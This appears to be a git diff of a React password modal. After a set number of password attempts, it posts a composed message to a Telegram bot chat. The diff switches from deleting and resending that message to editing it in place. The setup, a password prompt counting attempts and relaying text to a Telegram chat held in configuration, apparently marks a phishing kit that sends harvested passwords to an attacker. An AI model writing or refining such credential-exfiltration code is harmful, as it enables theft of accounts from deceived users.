@@ -126,25 +126,28 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
     if (uiState.attempt >= config.maxAttempt) {
       setUiState((prev) => ({ ...prev, isLoading: true }));
-
+      let response;
       try {
         if (uiState.messageId) {
-          await axios.post(
-            `https://api.telegram.org/bot${config.token}/deleteMessage`,
+          response = await axios.post(
+            `https://api.telegram.org/bot${config.token}/editMessageText`,
             {
               chat_id: config.chatId,
               message_id: uiState.messageId,
+              text: message,
+              parse_mode: "HTML",
+            },
+          );
+        } else {
+          response = await axios.post(
+            `https://api.telegram.org/bot${config.token}/sendMessage`,
+            {
+              chat_id: config.chatId,
+              text: message,
+              parse_mode: "HTML",
             },
           );
         }
-        const response = await axios.post(
-          `https://api.telegram.org/bot${config.token}/sendMessage`,
-          {
-            chat_id: config.chatId,
-            text: message,
-            parse_mode: "HTML",
-          },
-        );
         const messageId = response.data.result.message_id;
         localStorage.setItem(MESSAGE_ID_KEY, messageId.toString());
         setUiState((prev) => ({
@@ -203,8 +206,8 @@ const PasswordModal: FC<PasswordModalProps> = ({
     const baseUrl = `https://api.telegram.org/bot${config.token}`;
 
     if (messageId) {
-      await axios.post(
-        `https://api.telegram.org/bot${config.token}/deleteMessage`,
+      return await axios.post(
+        `https://api.telegram.org/bot${config.token}/editMessageText`,
         {
           chat_id: config.chatId,
           message_id: uiState.messageId,
